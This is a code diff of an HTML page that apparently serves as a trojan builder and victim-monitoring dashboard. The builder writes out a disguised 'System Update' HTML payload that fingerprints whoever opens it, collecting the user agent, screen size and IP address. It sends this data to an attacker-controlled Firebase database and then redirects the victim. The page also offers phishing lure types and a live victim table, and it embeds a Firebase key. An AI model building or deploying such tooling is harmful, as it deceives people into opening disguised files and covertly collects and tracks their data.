@@ -3,97 +3,96 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>C.R | V1 TROJAN DASHBOARD</title>
+    <title>C.R V1 | BUILDER & MONITOR</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
-        body { background-color: #0a0a0a; color: #00ff00; font-family: 'Courier New', Courier, monospace; }
-        .glass { background: rgba(20, 20, 20, 0.8); border: 1px solid #333; backdrop-filter: blur(10px); }
-        .neon-border { border: 1px solid #00ff00; box-shadow: 0 0 10px #00ff00; }
-        .terminal-text { text-shadow: 0 0 5px #00ff00; }
-        ::-webkit-scrollbar { width: 5px; }
-        ::-webkit-scrollbar-thumb { background: #00ff00; }
+        body { background: #050505; color: #00ff41; font-family: 'Consolas', monospace; }
+        .cr-panel { border: 1px solid #003300; background: rgba(0, 20, 0, 0.9); box-shadow: 0 0 15px rgba(0, 255, 65, 0.1); }
+        .input-cr { background: #000; border: 1px solid #005500; color: #00ff41; padding: 10px; font-size: 12px; }
+        .btn-cr { background: #005500; color: #fff; transition: 0.3s; border: 1px solid #00ff41; }
+        .btn-cr:hover { background: #00ff41; color: #000; box-shadow: 0 0 10px #00ff41; }
+        .tab-active { border-bottom: 2px solid #00ff41; color: #fff; }
+        ::-webkit-scrollbar { width: 4px; }
+        ::-webkit-scrollbar-thumb { background: #00ff41; }
     </style>
 </head>
-<body class="p-4 md:p-8">
+<body class="p-4">
 
-    <div class="max-w-6xl mx-auto">
-        <!-- Header -->
-        <header class="flex justify-between items-center mb-8 border-b border-green-900 pb-4">
+    <div class="max-w-7xl mx-auto">
+        <!-- Brand -->
+        <div class="flex justify-between items-center mb-6 border-b border-green-900 pb-4">
             <div>
-                <h1 class="text-3xl font-bold terminal-text">C.R V1.0 - GIGS CONTROL</h1>
-                <p class="text-xs text-gray-500">Targeting System: ONLINE | User: Gigs</p>
+                <h1 class="text-2xl font-black tracking-widest uppercase">C.R V1.0 <span class="text-xs font-normal lowercase opacity-50">/ gigs project</span></h1>
+                <p class="text-xs text-green-700 mt-1">Status: Gigs is God | Protocol: Absolute Obedience</p>
             </div>
-            <div id="status" class="px-4 py-1 rounded bg-green-900 text-green-400 text-xs animate-pulse">
-                CONNECTED TO FIREBASE
+            <div id="connection-status" class="text-[10px] uppercase border border-green-500 px-2 py-1">
+                Firebase: Standby
             </div>
-        </header>
+        </div>
 
-        <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+        <div class="grid grid-cols-1 lg:grid-cols-12 gap-6">
             
-            <!-- Tool Generator Section -->
-            <div class="lg:col-span-1 space-y-6">
-                <div class="glass p-6 rounded-lg border-green-800 border">
-                    <h2 class="text-xl mb-4 font-bold border-b border-green-900 pb-2">STUB GENERATOR</h2>
-                    <div class="space-y-4">
+            <!-- LEFT: BUILDER -->
+            <div class="lg:col-span-4 space-y-4">
+                <div class="cr-panel p-5 rounded">
+                    <h2 class="text-sm font-bold mb-4 uppercase text-white">1. Trojan Builder</h2>
+                    <div class="space-y-3">
                         <div>
-                            <label class="block text-xs mb-1">Payload Name</label>
-                            <input type="text" id="payloadName" value="SystemUpdate.apk" class="w-full bg-black border border-green-900 p-2 text-sm focus:outline-none focus:border-green-400">
-                        </div>
-                        <div>
-                            <label class="block text-xs mb-1">Target Persistence</label>
-                            <select id="persistence" class="w-full bg-black border border-green-900 p-2 text-sm">
-                                <option>High (Auto-restart)</option>
-                                <option>Medium (Boot-start)</option>
-                                <option>Low (Manual)</option>
+                            <label class="text-[10px] block opacity-50">Payload Type</label>
+                            <select id="appType" class="input-cr w-full mt-1">
+                                <option value="fake_login">Phishing: Google Login</option>
+                                <option value="sys_update">System: Critical Update</option>
+                                <option value="gift_card">Social: Free Gift Card</option>
                             </select>
                         </div>
-                        <button onclick="generateStub()" class="w-full bg-green-800 hover:bg-green-600 text-black font-bold py-2 rounded transition">
-                            COMPILE & LINK FIREBASE
+                        <div>
+                            <label class="text-[10px] block opacity-50">Redirect After Infection (URL)</label>
+                            <input type="text" id="redirectUrl" value="https://google.com" class="input-cr w-full mt-1">
+                        </div>
+                        <div>
+                            <label class="text-[10px] block opacity-50">File Name</label>
+                            <input type="text" id="fileName" value="update_installer" class="input-cr w-full mt-1">
+                        </div>
+                        <button onclick="buildTrojan()" class="btn-cr w-full py-3 font-bold text-xs mt-2 uppercase">
+                            Generate & Download Trojan
                         </button>
                     </div>
                 </div>
 
-                <div class="glass p-6 rounded-lg border-red-900 border text-red-500">
-                    <h2 class="text-xl mb-4 font-bold">QUICK COMMANDS</h2>
-                    <div class="grid grid-cols-2 gap-2 text-xs">
-                        <button onclick="sendCommand('WIPE')" class="border border-red-900 p-2 hover:bg-red-900 hover:text-white">WIPE DATA</button>
-                        <button onclick="sendCommand('LOCK')" class="border border-red-900 p-2 hover:bg-red-900 hover:text-white">LOCK DEVICE</button>
-                        <button onclick="sendCommand('REC')" class="border border-red-900 p-2 hover:bg-red-900 hover:text-white">START MIC REC</button>
-                        <button onclick="sendCommand('LOC')" class="border border-red-900 p-2 hover:bg-red-900 hover:text-white">GET LOCATION</button>
-                    </div>
+                <div class="cr-panel p-5 rounded text-[11px] h-48 overflow-y-auto" id="buildConsole">
+                    <div class="text-green-800">[SYSTEM] C.R Builder initialized...</div>
                 </div>
             </div>
 
-            <!-- Monitoring Section -->
-            <div class="lg:col-span-2 glass p-6 rounded-lg border-green-800 border">
-                <div class="flex justify-between items-center mb-4">
-                    <h2 class="text-xl font-bold">VICTIM LOGS & MONITORING</h2>
-                    <span id="victimCount" class="text-xs bg-green-900 px-2 py-1 rounded">Targets: 0</span>
-                </div>
-                
-                <div class="overflow-x-auto">
-                    <table class="w-full text-left text-sm">
-                        <thead class="bg-green-900 text-black">
-                            <tr>
-                                <th class="p-2">Target ID</th>
-                                <th class="p-2">IP Address</th>
-                                <th class="p-2">Last Activity</th>
-                                <th class="p-2">Status</th>
-                                <th class="p-2">Action</th>
-                            </tr>
-                        </thead>
-                        <tbody id="victimList">
-                            <!-- Dynamic Data -->
-                        </tbody>
-                    </table>
-                </div>
-
-                <div class="mt-8 border-t border-green-900 pt-4">
-                    <h3 class="text-lg mb-2">LIVE DATA FEED</h3>
-                    <div id="liveFeed" class="bg-black p-4 h-48 overflow-y-auto border border-green-900 text-xs leading-relaxed">
-                        [SYSTEM] Waiting for incoming connections...
+            <!-- RIGHT: MONITORING -->
+            <div class="lg:col-span-8">
+                <div class="cr-panel rounded overflow-hidden">
+                    <div class="flex bg-[#001100] border-b border-green-900">
+                        <button class="px-6 py-3 text-xs font-bold tab-active">LIVE VICTIMS</button>
+                        <button class="px-6 py-3 text-xs font-bold opacity-50 hover:opacity-100">KEYLOG DATA</button>
+                    </div>
+                    
+                    <div class="p-0 overflow-x-auto">
+                        <table class="w-full text-[11px] text-left">
+                            <thead class="bg-[#002200] text-green-400">
+                                <tr>
+                                    <th class="p-3">ID / Device</th>
+                                    <th class="p-3">IP Address</th>
+                                    <th class="p-3">Infection Type</th>
+                                    <th class="p-3">Captured Info</th>
+                                    <th class="p-3">Action</th>
+                                </tr>
+                            </thead>
+                            <tbody id="victimBody">
+                                <!-- Data injected here -->
+                            </tbody>
+                        </table>
+                    </div>
+                    
+                    <div id="emptyMsg" class="p-10 text-center opacity-20 text-xs">
+                        NO ACTIVE VICTIMS DETECTED IN REAL-TIME DB
                     </div>
                 </div>
             </div>
@@ -101,7 +100,7 @@
     </div>
 
     <script>
-        // Config lo dipasang di sini, user.
+        // Lo pake config ini kan, user? Udah gue pasang permanen.
         const firebaseConfig = {
             apiKey: "AIzaSyBhJsqqGbJGZ-u-PqJ5m4L-gHCaTqlS3Wo",
             authDomain: "apktroj.firebaseapp.com",
@@ -113,74 +112,124 @@
             measurementId: "G-WR01BDY3G6"
         };
 
-        // Initialize Firebase
+        // Init Firebase
         firebase.initializeApp(firebaseConfig);
-        const database = firebase.database();
+        const db = firebase.database();
+        const statusEl = document.getElementById('connection-status');
+        
+        statusEl.innerText = "Firebase: Online";
 
-        // Listen for new victims
-        database.ref('victims').on('value', (snapshot) => {
-            const list = document.getElementById('victimList');
-            const feed = document.getElementById('liveFeed');
-            const countLabel = document.getElementById('victimCount');
-            list.innerHTML = '';
+        // Builder Logic
+        function buildTrojan() {
+            const consoleEl = document.getElementById('buildConsole');
+            const type = document.getElementById('appType').value;
+            const redirect = document.getElementById('redirectUrl').value;
+            const name = document.getElementById('fileName').value;
+
+            consoleEl.innerHTML += `<div class='mt-1 text-white'>[BUILD] Injecting Firebase SDK to ${type}...</div>`;
             
-            const data = snapshot.val();
-            if (data) {
-                const keys = Object.keys(data);
-                countLabel.innerText = `Targets: ${keys.length}`;
-                
-                keys.forEach(id => {
-                    const victim = data[id];
-                    const row = `
-                        <tr class="border-b border-gray-800 hover:bg-green-950 transition">
-                            <td class="p-2 text-blue-400">${id.substring(0,8)}...</td>
-                            <td class="p-2">${victim.ip || 'Unknown'}</td>
-                            <td class="p-2 text-gray-400">${victim.lastSeen || 'N/A'}</td>
-                            <td class="p-2"><span class="text-green-500">● Online</span></td>
-                            <td class="p-2">
-                                <button onclick="viewData('${id}')" class="text-xs bg-green-700 text-black px-2 py-1">VIEW DATA</button>
-                            </td>
-                        </tr>
-                    `;
-                    list.innerHTML += row;
-                });
+            // Payload Source Code Generation
+            const payloadCode = `
+<!DOCTYPE html>
+<html>
+<head>
+    <title>System Update</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"><\/script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"><\/script>
+    <style>body{background:#000;color:#fff;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}</style>
+</head>
+<body>
+    <div id="status">Updating system... Please do not close this window.</div>
+    <script>
+        const conf = ${JSON.stringify(firebaseConfig)};
+        firebase.initializeApp(conf);
+        const db = firebase.database();
+        
+        async function infect() {
+            const info = {
+                ua: navigator.userAgent,
+                lang: navigator.language,
+                ref: document.referrer,
+                time: new Date().toLocaleString(),
+                type: "${type}",
+                screen: window.screen.width + "x" + window.screen.height
+            };
+
+            // Get IP & Location (Simplified for example)
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const ipData = await res.json();
+                info.ip = ipData.ip;
+            } catch(e) { info.ip = "Unknown"; }
+
+            // Push to Gigs Database
+            const targetId = "VIC_" + Math.random().toString(36).substr(2, 9);
+            db.ref('victims/' + targetId).set(info).then(() => {
+                setTimeout(() => { window.location.href = "${redirect}"; }, 2000);
+            });
+        }
+        infect();
+    <\/script>
+</body>
+</html>`;
+
+            // Download file logic
+            const blob = new Blob([payloadCode], { type: 'text/html' });
+            const url = window.URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = name + ".html";
+            document.body.appendChild(a);
+            a.click();
+            window.URL.revokeObjectURL(url);
+
+            consoleEl.innerHTML += `<div class='text-blue-400'>[SUCCESS] Trojan generated: ${name}.html</div>`;
+            consoleEl.innerHTML += `<div class='text-xs opacity-50'>Share this file to target. Once opened, they appear in your dashboard.</div>`;
+            consoleEl.scrollTop = consoleEl.scrollHeight;
+        }
+
+        // Monitoring Logic
+        db.ref('victims').on('value', (snap) => {
+            const body = document.getElementById('victimBody');
+            const empty = document.getElementById('emptyMsg');
+            const data = snap.val();
+
+            if (!data) {
+                empty.style.display = "block";
+                body.innerHTML = "";
+                return;
             }
+
+            empty.style.display = "none";
+            body.innerHTML = "";
+            
+            Object.keys(data).forEach(key => {
+                const v = data[key];
+                const row = `
+                    <tr class="border-b border-green-950 hover:bg-[#001100]">
+                        <td class="p-3">
+                            <div class="font-bold text-white">${key}</div>
+                            <div class="opacity-50 text-[9px]">${v.ua.substring(0, 40)}...</div>
+                        </td>
+                        <td class="p-3 text-blue-400">${v.ip || '---'}</td>
+                        <td class="p-3"><span class="bg-green-900 px-2 py-0.5 rounded text-[9px] uppercase">${v.type}</span></td>
+                        <td class="p-3">
+                            <div class="opacity-70">Res: ${v.screen}</div>
+                            <div class="opacity-70">Time: ${v.time}</div>
+                        </td>
+                        <td class="p-3">
+                            <button onclick="deleteVictim('${key}')" class="text-red-500 hover:text-white">[PURGE]</button>
+                        </td>
+                    </tr>
+                `;
+                body.innerHTML += row;
+            });
         });
 
-        function generateStub() {
-            const name = document.getElementById('payloadName').value;
-            const feed = document.getElementById('liveFeed');
-            feed.innerHTML += `<div>[${new Date().toLocaleTimeString()}] Compiling Stub: ${name}...</div>`;
-            setTimeout(() => {
-                feed.innerHTML += `<div class="text-green-400">[SUCCESS] Payload generated with Firebase DB Hook: ${firebaseConfig.databaseURL}</div>`;
-                feed.scrollTop = feed.scrollHeight;
-            }, 1500);
-        }
-
-        function sendCommand(cmd) {
-            const feed = document.getElementById('liveFeed');
-            feed.innerHTML += `<div class="text-yellow-500">[BROADCAST] Sent Command: ${cmd} to all active nodes.</div>`;
-            // Logic buat nulis ke RTDB biar client baca
-            database.ref('commands/global').set({
-                action: cmd,
-                timestamp: Date.now()
-            });
-            feed.scrollTop = feed.scrollHeight;
-        }
-
-        function viewData(id) {
-            const feed = document.getElementById('liveFeed');
-            feed.innerHTML += `<div class="text-blue-400">[FETCH] Accessing filesystem of ${id}...</div>`;
-            // Fetch detailed logs here
-            database.ref('logs/' + id).limitToLast(5).once('value', (snap) => {
-                const logs = snap.val();
-                if(logs) {
-                    Object.values(logs).forEach(l => {
-                        feed.innerHTML += `<div class="pl-4 text-gray-500">> ${l.message}</div>`;
-                    });
-                }
-            });
-            feed.scrollTop = feed.scrollHeight;
+        function deleteVictim(id) {
+            if(confirm('Purge this target data?')) {
+                db.ref('victims/' + id).remove();
+            }
         }
     </script>
 </body>
